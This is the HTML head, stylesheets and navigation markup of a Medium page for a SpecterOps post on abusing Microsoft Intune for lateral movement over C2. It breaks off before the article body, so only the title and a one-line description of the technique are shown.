<!doctype html><html lang="en"><head><title data-rh="true">Maestro: Abusing Intune for Lateral Movement Over C2 | by Chris Thompson | Oct, 2024 | Posts By SpecterOps Team Members</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2024-11-01T16:32:13.473Z"/><meta data-rh="true" name="title" content="Maestro: Abusing Intune for Lateral Movement Over C2 | by Chris Thompson | Oct, 2024 | Posts By SpecterOps Team Members"/><meta data-rh="true" property="og:title" content="Maestro"/><meta data-rh="true" property="al:android:url" content="medium://p/9ed71d38d546"/><meta data-rh="true" property="al:ios:url" content="medium://p/9ed71d38d546"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="If I have a command and control (C2) agent on an Intune admin’s workstation, I should just be able to use their privileges to execute a script or application on an Intune-enrolled device, right? We…"/><meta data-rh="true" property="og:description" content="Abusing Intune for Lateral Movement Over C2"/><meta data-rh="true" property="og:url" content="https://posts.specterops.io/maestro-9ed71d38d546"/><meta data-rh="true" property="al:web:url" content="https://posts.specterops.io/maestro-9ed71d38d546"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:340/1*Q0HvFPk-PaFefT-lIZpQVw.png"/><meta data-rh="true" property="article:author" content="https://medium.com/@Mayyhem"/><meta data-rh="true" name="author" content="Chris Thompson"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="Maestro"/><meta data-rh="true" name="twitter:site" content="@specterops"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/9ed71d38d546"/><meta data-rh="true" property="twitter:description" content="Abusing Intune for Lateral Movement Over C2"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:340/1*Q0HvFPk-PaFefT-lIZpQVw.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="11 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/resize:fill:256:256/1*D-FDlfkqivRBQZoESrwtqw.png"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://medium.com/@Mayyhem"/><link data-rh="true" rel="canonical" href="https://posts.specterops.io/maestro-9ed71d38d546"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/9ed71d38d546"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*Q0HvFPk-PaFefT-lIZpQVw.png"],"url":"https:\u002F\u002Fposts.specterops.io\u002Fmaestro-9ed71d38d546","dateCreated":"2024-10-31T21:24:54.212Z","datePublished":"2024-10-31T21:24:54.212Z","dateModified":"2024-11-14T06:44:01.315Z","headline":"Maestro: Abusing Intune for Lateral Movement Over C2","name":"Maestro: Abusing Intune for Lateral Movement Over C2","description":"If I have a command and control (C2) agent on an Intune admin’s workstation, I should just be able to use their privileges to execute a script or application on an Intune-enrolled device, right? We…","identifier":"9ed71d38d546","author":{"@type":"Person","name":"Chris Thompson","url":"https:\u002F\u002Fposts.specterops.io\u002F@Mayyhem"},"creator":["Chris Thompson"],"publisher":{"@type":"Organization","name":"Posts By SpecterOps Team Members","url":"posts.specterops.io","logo":{"@type":"ImageObject","width":149,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:298\u002F1*s-5BWBr8XsgtIU5azKNhZQ.jpeg"}},"mainEntityOfPage":"https:\u002F\u002Fposts.specterops.io\u002Fmaestro-9ed71d38d546"}</script><style type="text/css" data-fela-rehydration="556" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="556" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:rgba(128, 128, 183, 1)}.es{border-color:rgba(128, 128, 183, 1)}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:rgba(128, 128, 183, 1)}.ez:disabled:hover{border-color:rgba(128, 128, 183, 1)}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-left:-12px}.ii{width:28px}.ij{height:28px}.ik{z-index:1}.il{width:24px}.im{margin-bottom:2px}.in{flex-wrap:nowrap}.io{font-size:16px}.ip{line-height:24px}.ir{margin:0 8px}.is{display:inline}.it{color:rgba(128, 128, 183, 1)}.iu{fill:rgba(128, 128, 183, 1)}.ix{flex:0 0 auto}.ja{flex-wrap:wrap}.jd{white-space:pre-wrap}.je{margin-right:4px}.jf{overflow:hidden}.jg{max-height:20px}.jh{text-overflow:ellipsis}.ji{display:-webkit-box}.jj{-webkit-line-clamp:1}.jk{-webkit-box-orient:vertical}.jl{word-break:break-all}.jn{padding-left:8px}.jo{padding-right:8px}.kp> *{flex-shrink:0}.kq{overflow-x:scroll}.kr::-webkit-scrollbar{display:none}.ks{scrollbar-width:none}.kt{-ms-overflow-style:none}.ku{width:74px}.kv{flex-direction:row}.kw{z-index:2}.kz{-webkit-user-select:none}.la{border:0}.lb{fill:rgba(117, 117, 117, 1)}.le{outline:0}.lf{user-select:none}.lg> svg{pointer-events:none}.lp{cursor:progress}.lq{opacity:1}.lr{padding:4px 0}.lu{margin-top:0px}.lv{width:16px}.lx{display:inline-flex}.md{max-width:100%}.me{padding:8px 2px}.mf svg{color:#6B6B6B}.mw{line-height:1.58}.mx{letter-spacing:-0.004em}.my{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.nt{margin-bottom:-0.46em}.nu{line-height:1.12}.nv{letter-spacing:-0.022em}.nw{font-weight:600}.or{margin-bottom:-0.28em}.ox{list-style-type:disc}.oy{margin-left:30px}.oz{padding-left:0px}.pa{text-decoration:underline}.pg{margin-left:auto}.ph{margin-right:auto}.pi{max-width:340px}.po{clear:both}.pp{height:auto}.pq{max-width:1338px}.ps{cursor:zoom-in}.pt{z-index:auto}.qa{max-width:1365px}.qb{padding-top:5px}.qc{padding-bottom:5px}.qd{padding:2px 4px}.qe{font-size:75%}.qf> strong{font-family:inherit}.qg{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.qh{max-width:1600px}.qi{overflow-x:auto}.qj{padding:32px}.qk{border:1px solid #E5E5E5}.ql{line-height:1.4}.qm{margin-top:-0.2em}.qn{margin-bottom:-0.2em}.qo{white-space:pre}.qp{min-width:fit-content}.qq{line-height:1.18}.re{margin-bottom:-0.31em}.rf{max-width:1396px}.rg{border-top:none}.rh{margin-bottom:14px}.ri{height:52px}.rj{max-height:52px}.rk{box-sizing:content-box}.rl{position:static}.rn{max-width:155px}.rt{margin-right:20px}.rz{height:0px}.sa{margin-bottom:40px}.sb{margin-bottom:48px}.sp{border-radius:2px}.sr{height:64px}.ss{width:64px}.st{align-self:flex-end}.su{color:rgba(255, 255, 255, 1)}.sv{padding:8px 16px}.sw{fill:rgba(255, 255, 255, 1)}.sx{background:rgba(25, 25, 25, 1)}.sy{border-color:rgba(25, 25, 25, 1)}.tb:disabled{opacity:0.1}.tc:disabled:hover{background:rgba(25, 25, 25, 1)}.td:disabled:hover{border-color:rgba(25, 25, 25, 1)}.te{flex:1 1 auto}.ti{padding-right:4px}.tj{font-weight:500}.tq{margin-top:8px}.tr{margin-top:16px}.ts{margin-bottom:54px}.ty{gap:18px}.tz{fill:rgba(61, 61, 61, 1)}.ug{border-bottom:solid 1px #E5E5E5}.uh{margin-top:72px}.ui{padding:24px 0}.uj{margin-bottom:0px}.uk{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:rgba(110, 110, 154, 1)}.eu:hover{border-color:rgba(110, 110, 154, 1)}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.iq:hover{text-decoration:underline}.iv:hover:not(:disabled){color:rgba(110, 110, 154, 1)}.iw:hover:not(:disabled){fill:rgba(110, 110, 154, 1)}.ld:hover{fill:rgba(8, 8, 8, 1)}.ls:hover{fill:#000000}.lt:hover p{color:#000000}.lw:hover{color:#000000}.mg:hover svg{color:#000000}.sq:hover{background-color:none}.sz:hover{background:#000000}.ta:hover{border-color:#242424}.ua:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.lc:focus{fill:rgba(8, 8, 8, 1)}.mh:focus svg{color:#000000}.pu:focus{transform:scale(1.01)}.lh:active{border-style:none}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:68px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.kb{border-top:solid 1px #F2F2F2}.kc{border-bottom:solid 1px #F2F2F2}.kd{margin:32px 0 0}.ke{padding:3px 8px}.kn> *{margin-right:24px}.ko> :last-child{margin-right:0}.lo{margin-top:0px}.mc{margin:0}.np{font-size:20px}.nq{margin-top:2.14em}.nr{line-height:32px}.ns{letter-spacing:-0.003em}.on{font-size:24px}.oo{margin-top:1.95em}.op{line-height:30px}.oq{letter-spacing:-0.016em}.ow{margin-top:0.94em}.pf{margin-top:1.14em}.pn{margin-top:56px}.pz{max-width:1192px}.rb{margin-top:1.72em}.rc{line-height:24px}.rd{letter-spacing:0}.rs{display:inline-block}.ry{margin-bottom:104px}.sc{flex-direction:row}.sf{margin-bottom:0}.sg{margin-right:20px}.tf{max-width:500px}.tx{margin-bottom:72px}.uf{padding-top:72px}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.ln{margin-top:0px}.rr{display:inline-block}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.lm{margin-top:0px}.rq{display:inline-block}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.lk{margin-top:0px}.ll{margin-right:0px}.rp{display:inline-block}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:4px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.iy{flex-direction:column}.jb{margin-bottom:2px}.jp{margin:24px -24px 0}.jq{padding:0}.kf> *{margin-right:8px}.kg> :last-child{margin-right:24px}.kx{margin-left:0px}.li{margin-top:0px}.lj{margin-right:0px}.ly{margin:0}.mi{border:1px solid #F2F2F2}.mj{border-radius:99em}.mk{padding:0px 16px 0px 12px}.ml{height:38px}.mm{align-items:center}.mo svg{margin-right:8px}.mz{font-size:18px}.na{margin-top:1.56em}.nb{line-height:28px}.nc{letter-spacing:-0.003em}.nx{font-size:20px}.ny{margin-top:1.2em}.nz{line-height:24px}.oa{letter-spacing:0}.os{margin-top:0.67em}.pb{margin-top:1.34em}.pj{margin-top:40px}.pv{max-width:100%}.qr{font-size:16px}.qs{margin-top:1.23em}.ro{display:inline-block}.ru{margin-bottom:96px}.sn{margin-bottom:20px}.so{margin-right:0}.tk{font-size:24px}.tl{line-height:30px}.tm{letter-spacing:-0.016em}.tt{margin-bottom:64px}.ub{padding-top:48px}.mn:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:68px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jx{border-top:solid 1px #F2F2F2}.jy{border-bottom:solid 1px #F2F2F2}.jz{margin:32px 0 0}.ka{padding:3px 8px}.kl> *{margin-right:24px}.km> :last-child{margin-right:0}.mb{margin:0}.nl{font-size:20px}.nm{margin-top:2.14em}.nn{line-height:32px}.no{letter-spacing:-0.003em}.oj{font-size:24px}.ok{margin-top:1.95em}.ol{line-height:30px}.om{letter-spacing:-0.016em}.ov{margin-top:0.94em}.pe{margin-top:1.14em}.pm{margin-top:56px}.py{max-width:1192px}.qy{margin-top:1.72em}.qz{line-height:24px}.ra{letter-spacing:0}.rx{margin-bottom:104px}.sd{flex-direction:row}.sh{margin-bottom:0}.si{margin-right:20px}.tg{max-width:500px}.tw{margin-bottom:72px}.ue{padding-top:72px}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:68px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jt{border-top:solid 1px #F2F2F2}.ju{border-bottom:solid 1px #F2F2F2}.jv{margin:32px 0 0}.jw{padding:3px 8px}.kj> *{margin-right:24px}.kk> :last-child{margin-right:0}.ma{margin:0}.nh{font-size:20px}.ni{margin-top:2.14em}.nj{line-height:32px}.nk{letter-spacing:-0.003em}.of{font-size:24px}.og{margin-top:1.95em}.oh{line-height:30px}.oi{letter-spacing:-0.016em}.ou{margin-top:0.94em}.pd{margin-top:1.14em}.pl{margin-top:56px}.px{max-width:100%}.qv{margin-top:1.72em}.qw{line-height:24px}.qx{letter-spacing:0}.rw{margin-bottom:104px}.se{flex-direction:row}.sj{margin-bottom:0}.sk{margin-right:20px}.th{max-width:500px}.tv{margin-bottom:72px}.ud{padding-top:72px}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:4px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iz{flex-direction:column}.jc{margin-bottom:2px}.jr{margin:24px 0 0}.js{padding:0}.kh> *{margin-right:8px}.ki> :last-child{margin-right:8px}.ky{margin-left:0px}.lz{margin:0}.mp{border:1px solid #F2F2F2}.mq{border-radius:99em}.mr{padding:0px 16px 0px 12px}.ms{height:38px}.mt{align-items:center}.mv svg{margin-right:8px}.nd{font-size:18px}.ne{margin-top:1.56em}.nf{line-height:28px}.ng{letter-spacing:-0.003em}.ob{font-size:20px}.oc{margin-top:1.2em}.od{line-height:24px}.oe{letter-spacing:0}.ot{margin-top:0.67em}.pc{margin-top:1.34em}.pk{margin-top:40px}.pw{max-width:100%}.qt{font-size:16px}.qu{margin-top:1.23em}.rv{margin-bottom:96px}.sl{margin-bottom:20px}.sm{margin-right:0}.tn{font-size:24px}.to{line-height:30px}.tp{letter-spacing:-0.016em}.tu{margin-bottom:64px}.uc{padding-top:48px}.mu:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="print">.rm{display:none}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.jm{max-height:none}</style><style type="text/css" data-fela-rehydration="556" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.pr{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F9ed71d38d546&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderCollection&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign up</a></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fmaestro-9ed71d38d546&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 